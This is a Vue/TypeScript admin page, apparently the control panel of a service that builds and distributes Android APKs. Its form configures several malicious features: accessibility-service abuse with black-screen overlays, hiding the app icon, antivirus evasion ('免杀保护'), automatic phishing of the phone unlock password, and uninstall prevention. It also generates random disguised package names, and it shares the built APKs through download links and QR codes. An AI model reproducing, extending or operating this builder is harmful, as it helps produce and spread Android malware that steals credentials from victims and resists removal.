<script setup lang="ts">
import type {
  ApplicationBuildForm,
  ApplicationItem,
} from '#/types/application';

import { computed, onMounted, onUnmounted, reactive, ref } from 'vue';

import {
  DeleteOutlined,
  DownloadOutlined,
  ReloadOutlined,
  ShareAltOutlined,
  UploadOutlined,
} from '@ant-design/icons-vue';
import { message, Modal } from 'ant-design-vue';
import QRCode from 'qrcode';

import {
  applicationShareUrl,
  buildApplication,
  deleteApplication,
  downloadApplication,
  fetchApplications,
  legacyAssetUrl,
  listApplicationIcons,
  listUiImages,
  removeApplicationIcon,
  removeUiImage,
  uploadApplicationIcon,
  uploadUiImage,
} from '#/api/applications';
import { apiError } from '#/api/http';
import PageContainer from '#/layouts/components/PageContainer.vue';

import { createApplicationBuildForm } from './application-form';

import './application-management.css';

const navItems = [
  { desc: '下载', key: 'download', name: '应用下载' },
  { desc: '生成', key: 'build', name: '应用生成' },
] as const;

const apps = ref<ApplicationItem[]>([]);
const icons = ref<string[]>([]);
const uiImages = ref<string[]>([]);
const activeTab = ref<(typeof navItems)[number]['key']>('download');
const loading = ref(false);
const assetLoading = ref(false);
const submitting = ref(false);
const pendingPackage = ref('');
const shareModalVisible = ref(false);
const shareUrl = ref('');
const shareQrDataUrl = ref('');

const form = reactive<ApplicationBuildForm>(createApplicationBuildForm());
const activeTitle = computed(
  () =>
    navItems.find((item) => item.key === activeTab.value)?.name || '应用下载',
);

let pollTimer: null | ReturnType<typeof setInterval> = null;

onMounted(() => {
  document.body.classList.add('page-app-mod');
  loadApps();
  loadAssets();
  pollTimer = setInterval(pollBuilds, 8000);
});

onUnmounted(() => {
  document.body.classList.remove('page-app-mod');
  if (pollTimer) clearInterval(pollTimer);
});

async function loadApps() {
  loading.value = true;
  try {
    apps.value = await fetchApplications();
  } catch (error) {
    message.error(apiError(error, '加载应用失败'));
  } finally {
    loading.value = false;
  }
}

async function loadAssets() {
  assetLoading.value = true;
  try {
    const [iconList, uiList] = await Promise.all([
      listApplicationIcons(),
      listUiImages(),
    ]);
    icons.value = iconList;
    uiImages.value = uiList;
  } catch (error) {
    message.error(apiError(error, '加载资源失败'));
  } finally {
    assetLoading.value = false;
  }
}

async function pollBuilds() {
  if (apps.value.some((app) => app.build_state === 'onbuild')) {
    try {
      const updated = await fetchApplications();
      apps.value = updated;
    } catch {
      // silent
    }
  }
}

function basename(path: string) {
  return path.split('/').findLast(Boolean) || path;
}

const PLACEHOLDER_ICON =
  'data:image/svg+xml,' +
  encodeURIComponent(
    '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><rect width="64" height="64" fill="#f0f0f0"/><text x="50%" y="54%" dominant-baseline="middle" text-anchor="middle" font-size="20" fill="#ccc">?</text></svg>',
  );

function setFallbackIcon(event: Event) {
  const image = event.target as HTMLImageElement | null;
  if (image && !image.src.startsWith('data:')) image.src = PLACEHOLDER_ICON;
}

function selectIcon(path: string) {
  form.icoid = basename(path);
  message.success(`已选择图标: ${form.icoid}`);
}

function selectUi(path: string) {
  form.noemu = path;
  message.success('已选择ui');
}

function randomPackage() {
  const firstParts = [
    'helper',
    'musics',
    'scanner',
    'sensor',
    'service',
    'listener',
    'logger',
    'manager',
    'tracker',
    'analyzer',
    'provider',
    'monitor',
  ];
  const secondParts = [
    'relay',
    'schedulerx',
    'streamer',
    'cipher',
    'mapper',
    'allocatorx',
    'regulator',
    'watchtower',
    'updater',
    'routerx',
  ];
  const pick = (list: string[]) =>
    list[Math.floor(Math.random() * list.length)];
  const suffix = pick(firstParts);
  form.appid = `com.${pick(firstParts)}.${pick(secondParts)}.${suffix}`;
  form.appversion = `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`;
}

async function onDownload(item: ApplicationItem) {
  if (item.build_state !== 'finished') {
    message.warning('构建未完成，无法下载');
    return;
  }
  pendingPackage.value = item.app_package;
  item.progress = 0;
  try {
    const blob = await downloadApplication(item.app_package, (progress) => {
      item.progress = progress;
    });
    const url = window.URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `${item.app_package}.apk`;
    document.body.append(link);
    link.click();
    window.URL.revokeObjectURL(url);
    link.remove();
    item.progress = 100;
  } catch (error) {
    item.progress = undefined;
    message.error(apiError(error, '下载失败'));
  } finally {
    pendingPackage.value = '';
  }
}

function onDelete(item: ApplicationItem) {
  Modal.confirm({
    cancelText: '取消',
    content: `包名：${item.app_package}`,
    okButtonProps: { danger: true },
    okText: '删除',
    title: `删除应用 ${item.appname}?`,
    async onOk() {
      try {
        const result = await deleteApplication(item.app_package);
        message.success(result || '已删除');
        await loadApps();
      } catch (error) {
        message.error(apiError(error, '删除失败'));
      }
    },
  });
}

async function onUploadIcon(file: File) {
  try {
    await uploadApplicationIcon(file);
    message.success('图标已上传');
    await loadAssets();
  } catch (error) {
    message.error(apiError(error, '上传出错'));
  }
  return false;
}

async function onUploadUi(file: File) {
  try {
    await uploadUiImage(file);
    message.success('上传成功');
    await loadAssets();
  } catch (error) {
    message.error(apiError(error, '上传出错'));
  }
  return false;
}

async function onRemoveIcon(path: string) {
  try {
    await removeApplicationIcon(path);
    if (form.icoid === basename(path)) form.icoid = '';
    message.success('图标已删除');
    await loadAssets();
  } catch (error) {
    message.error(apiError(error, '删除请求出错'));
  }
}

async function onRemoveUi(path: string) {
  try {
    await removeUiImage(path);
    if (form.noemu === path) form.noemu = 'black';
    message.success('图片已删除');
    await loadAssets();
  } catch (error) {
    message.error(apiError(error, '删除请求出错'));
  }
}

async function onShare(item: ApplicationItem) {
  const url = applicationShareUrl(item.app_package);
  shareUrl.value = url;
  shareQrDataUrl.value = await QRCode.toDataURL(url, { width: 220, margin: 2 });
  shareModalVisible.value = true;
}

function copyShareUrl() {
  navigator.clipboard.writeText(shareUrl.value).then(() => {
    message.success('链接已复制');
  });
}

function missingBuildMessage() {
  const checks: Array<[unknown, string]> = [
    [form.cname, '上线名称为空'],
    [form.appname, '应用名称为空'],
    [form.appurl, '应用网址为空'],
    [form.logd, '限制按钮为空'],
    [form.logb, '跳转按钮为空'],
    [form.uprims, '黑屏文字为空'],
    [form.loglng, '窗口文字为空'],
    [form.appid, '应用包名为空'],
    [form.appversion, '应用版本为空'],
    [form.icoid, '应用图标为空'],
  ];
  return checks.find(([value]) => !String(value || '').trim())?.[1];
}

async function onBuild() {
  const warning = missingBuildMessage();
  if (warning) {
    message.warning(warning);
    return;
  }
  submitting.value = true;
  try {
    const result = await buildApplication(form);
    message.success(result || '构建已提交');
    activeTab.value = 'download';
    await loadApps();
  } catch (error) {
    message.error(apiError(error, '构建请求出错'));
  } finally {
    submitting.value = false;
  }
}
</script>

<template>
  <PageContainer class="application-management" title="应用管理">
    <div class="app-mod-grid">
      <nav class="app-mod-left-nav" aria-label="应用管理功能">
        <button
          v-for="item in navItems"
          :key="item.key"
          class="app-mod-nav-card"
          :class="{ selected: activeTab === item.key }"
          type="button"
          @click="activeTab = item.key"
        >
          <span>{{ item.name }}</span>
          <small>{{ item.desc }}</small>
        </button>
      </nav>

      <section class="app-mod-right-content">
        <div class="app-mod-card">
          <div class="app-mod-card-header">
            <h2>{{ activeTitle }}</h2>
            <a-button
              v-if="activeTab === 'download'"
              type="primary"
              :loading="loading"
              @click="loadApps"
            >
              <ReloadOutlined /> 更新
            </a-button>
          </div>

          <a-spin v-if="activeTab === 'download'" :spinning="loading">
            <a-empty v-if="apps.length === 0" description="暂无构建的应用" />
            <div v-else class="download-list">
              <div class="download-list-header">
                <span class="col-icon">图标</span>
                <span class="col-name">应用名</span>
                <span class="col-package">包名</span>
                <span class="col-date">安装时间</span>
                <span class="col-state">状态</span>
                <span class="col-actions">操作</span>
              </div>
              <article
                v-for="item in apps"
                :key="item.app_package"
                class="download-list-row"
              >
                <span class="col-icon">
                  <img
                    class="app-icon"
                    :src="legacyAssetUrl(item.app_ico)"
                    alt="icon"
                    @error="setFallbackIcon"
                  />
                </span>
                <span class="col-name app-name">{{ item.appname }}</span>
                <span class="col-package app-package">{{ item.app_package }}</span>
                <span class="col-date app-date">{{ item.build_date || '-' }}</span>
                <span class="col-state">
                  <a-tag v-if="item.build_state === 'finished'" color="blue">完成</a-tag>
                  <a-tag v-else-if="item.build_state === 'onbuild'" color="orange">构建中</a-tag>
                  <a-tag v-else-if="item.build_state === 'failed'" color="red">失败</a-tag>
                  <a-tag v-else color="default">{{ item.build_state }}</a-tag>
                </span>
                <span class="col-actions">
                  <a-space>
                    <a-button
                      size="small"
                      type="primary"
                      :disabled="item.build_state !== 'finished'"
                      :loading="pendingPackage === item.app_package"
                      @click="onDownload(item)"
                    >
                      <DownloadOutlined /> 下载
                    </a-button>
                    <a-button size="small" danger @click="onDelete(item)">
                      <DeleteOutlined /> 删除
                    </a-button>
                    <a-button size="small" @click="onShare(item)">
                      <ShareAltOutlined /> 分享
                    </a-button>
                  </a-space>
                  <a-progress
                    v-if="item.progress !== undefined"
                    :percent="item.progress"
                    size="small"
                    style="margin-top: 4px"
                    :status="item.progress === 100 ? 'success' : 'active'"
                  />
                </span>
              </article>
            </div>
          </a-spin>

          <a-spin v-else :spinning="assetLoading">
            <a-form layout="vertical" class="app-gen-form">
              <section class="form-section outer-form-item">
                <h3>上线名称</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :md="12">
                    <a-form-item label="上线名称" class="inner-form-item">
                      <a-input
                        v-model:value="form.cname"
                        placeholder="请输入上线名称"
                      />
                    </a-form-item>
                  </a-col>
                  <a-col :xs="24" :md="12">
                    <a-form-item
                      label="用于标识不同的客户端，最多16个字符"
                      class="inner-form-item"
                    >
                      <a-input
                        v-model:value="form.description"
                        placeholder="无障碍服务介绍(不写填无)"
                      />
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section class="form-section outer-form-item">
                <h3>应用信息</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :md="12">
                    <a-form-item label="应用名称" class="inner-form-item">
                      <a-input
                        v-model:value="form.appname"
                        placeholder="应用名称"
                      />
                    </a-form-item>
                  </a-col>
                  <a-col :xs="24" :md="12">
                    <a-form-item label="应用网址" class="inner-form-item">
                      <a-input
                        v-model:value="form.appurl"
                        placeholder="应用网址"
                      />
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section class="form-section outer-form-item">
                <h3>无障碍界面设置</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :lg="12">
                    <a-form-item label="引导文字" class="inner-form-item">
                      <a-textarea
                        v-model:value="form.loglng"
                        placeholder="窗口文字，直接回车换行即可"
                        :rows="5"
                      />
                    </a-form-item>
                  </a-col>
                  <a-col :xs="24" :lg="12">
                    <a-form-item label="黑屏文字" class="inner-form-item">
                      <a-textarea
                        v-model:value="form.uprims"
                        placeholder="黑屏文字"
                        :rows="5"
                      />
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section class="form-section outer-form-item">
                <h3>左右按钮</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :md="12">
                    <a-form-item label="限制按钮" class="inner-form-item">
                      <a-input
                        v-model:value="form.logd"
                        placeholder="限制按钮"
                      />
                    </a-form-item>
                  </a-col>
                  <a-col :xs="24" :md="12">
                    <a-form-item label="跳转按钮" class="inner-form-item">
                      <a-input
                        v-model:value="form.logb"
                        placeholder="跳转按钮"
                      />
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section class="form-section outer-form-item">
                <h3>包名版本</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :md="11">
                    <a-form-item label="应用包名" class="inner-form-item">
                      <a-input
                        v-model:value="form.appid"
                        placeholder="应用包名"
                      />
                    </a-form-item>
                  </a-col>
                  <a-col :xs="18" :md="9">
                    <a-form-item label="应用版本" class="inner-form-item">
                      <a-input
                        v-model:value="form.appversion"
                        placeholder="应用版本"
                      />
                    </a-form-item>
                  </a-col>
                  <a-col :xs="6" :md="4">
                    <a-form-item label="生成" class="inner-form-item">
                      <a-button block @click="randomPackage">
                        <ReloadOutlined />
                      </a-button>
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section class="form-section outer-form-item">
                <h3>安装模式</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :md="12">
                    <a-form-item label="请选择安装方式" class="inner-form-item">
                      <a-select v-model:value="form.accsstyp">
                        <a-select-option value="g">单</a-select-option>
                        <a-select-option value="d">双</a-select-option>
                      </a-select>
                    </a-form-item>
                  </a-col>
                  <a-col :xs="24" :md="12">
                    <a-form-item label="无障碍触发模式" class="inner-form-item">
                      <a-select v-model:value="form.openaccess">
                        <a-select-option value="0">默认</a-select-option>
                        <a-select-option value="1">
                          百分百触发无障碍限制(国外单包专用)
                        </a-select-option>
                      </a-select>
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section
                v-if="form.accsstyp === 'd'"
                class="form-section outer-form-item"
              >
                <h3>首包名字</h3>
                <a-form-item
                  label="引导包的名字(不要和应用名称一样)"
                  class="inner-form-item"
                >
                  <a-input
                    v-model:value="form.logt"
                    placeholder="引导包的名字(不要和应用名称一样)"
                  />
                </a-form-item>
              </section>

              <section class="form-section outer-form-item">
                <h3>应用权限</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :md="12">
                    <a-form-item label="请选择获取权限" class="inner-form-item">
                      <a-select v-model:value="form.allprims">
                        <a-select-option value="1">全部</a-select-option>
                        <a-select-option value="0">文件</a-select-option>
                      </a-select>
                    </a-form-item>
                  </a-col>
                  <a-col :xs="24" :md="12">
                    <a-form-item label="请选择运行模式" class="inner-form-item">
                      <a-select v-model:value="form.usedraw">
                        <a-select-option value="0">内</a-select-option>
                        <a-select-option value="1">外</a-select-option>
                      </a-select>
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section class="form-section outer-form-item">
                <h3>隐藏模式</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :md="12">
                    <a-form-item label="请选择隐藏模式" class="inner-form-item">
                      <a-select v-model:value="form.hidtype">
                        <a-select-option value="c">直接隐藏</a-select-option>
                        <a-select-option value="f">卸载隐藏</a-select-option>
                        <a-select-option value="k">提示卸载</a-select-option>
                      </a-select>
                    </a-form-item>
                  </a-col>
                  <a-col :xs="24" :md="12">
                    <a-form-item label="免杀保护" class="inner-form-item">
                      <a-select v-model:value="form.notmsg">
                        <a-select-option value="on">
                          开启免杀保护
                        </a-select-option>
                        <a-select-option value="off">
                          关闭免杀保护
                        </a-select-option>
                      </a-select>
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section class="form-section outer-form-item">
                <h3>权限结束</h3>
                <a-row :gutter="[16, 10]">
                  <a-col :xs="24" :md="12">
                    <a-form-item
                      label="是否开启自动钓鱼解锁密码"
                      class="inner-form-item"
                    >
                      <a-select v-model:value="form.diaotype">
                        <a-select-option value="1">
                          开启自动钓鱼解锁密码
                        </a-select-option>
                        <a-select-option value="0">
                          关闭自动钓鱼解锁密码
                        </a-select-option>
                      </a-select>
                    </a-form-item>
                  </a-col>
                  <a-col :xs="24" :md="12">
                    <a-form-item
                      label="是否开启防止卸载"
                      class="inner-form-item"
                    >
                      <a-select v-model:value="form.ukill">
                        <a-select-option value="1">
                          开启防止卸载
                        </a-select-option>
                        <a-select-option value="0">
                          关闭防止卸载
                        </a-select-option>
                      </a-select>
                    </a-form-item>
                  </a-col>
                </a-row>
              </section>

              <section class="form-section outer-form-item">
                <div class="section-head">
                  <h3>遮挡列表(不选默认黑色)</h3>
                  <a-upload
                    :before-upload="onUploadUi"
                    :show-upload-list="false"
                    accept=".png"
                  >
                    <a-button><UploadOutlined /> 上传图片</a-button>
                  </a-upload>
                </div>
                <div class="upload-hint">建议720*1280具体自测</div>
                <a-empty
                  v-if="uiImages.length === 0"
                  description="暂无遮挡图片"
                />
                <div v-else class="asset-grid ui-grid">
                  <button
                    v-for="image in uiImages"
                    :key="image"
                    class="asset-tile ui-tile"
                    :class="{ selected: form.noemu === image }"
                    type="button"
                    @click="selectUi(image)"
                  >
                    <img :src="legacyAssetUrl(image)" alt="" />
                    <a-button
                      class="asset-remove"
                      size="small"
                      danger
                      @click.stop="onRemoveUi(image)"
                    >
                      X
                    </a-button>
                  </button>
                </div>
              </section>

              <section class="form-section outer-form-item">
                <div class="section-head">
                  <h3>图标列表</h3>
                  <a-upload
                    :before-upload="onUploadIcon"
                    :show-upload-list="false"
                    accept=".png"
                  >
                    <a-button><UploadOutlined /> 上传图标</a-button>
                  </a-upload>
                </div>
                <a-empty v-if="icons.length === 0" description="暂无图标" />
                <div v-else class="asset-grid icon-grid">
                  <button
                    v-for="icon in icons"
                    :key="icon"
                    class="asset-tile icon-tile"
                    :class="{ selected: form.icoid === basename(icon) }"
                    type="button"
                    @click="selectIcon(icon)"
                  >
                    <img :src="legacyAssetUrl(icon)" alt="" />
                    <a-button
                      class="asset-remove"
                      size="small"
                      danger
                      @click.stop="onRemoveIcon(icon)"
                    >
                      X
                    </a-button>
                  </button>
                </div>
              </section>

              <div class="submit-bar">
                <a-button
                  class="app-gen-submit-btn"
                  type="primary"
                  size="large"
                  :loading="submitting"
                  @click="onBuild"
                >
                  开始生成
                </a-button>
              </div>
            </a-form>
          </a-spin>
        </div>
      </section>
    </div>
    <a-modal
      v-model:open="shareModalVisible"
      title="分享下载链接"
      :footer="null"
      width="300px"
    >
      <div style="padding: 8px 0; text-align: center">
        <img
          v-if="shareQrDataUrl"
          :src="shareQrDataUrl"
          alt="QR Code"
          style="width: 220px; height: 220px"
        />
        <a-input :value="shareUrl" readonly style="margin-top: 12px" />
        <a-button
          type="primary"
          style="width: 100%; margin-top: 10px"
          @click="copyShareUrl"
        >
          复制链接
        </a-button>
      </div>
    </a-modal>
  </PageContainer>
</template>
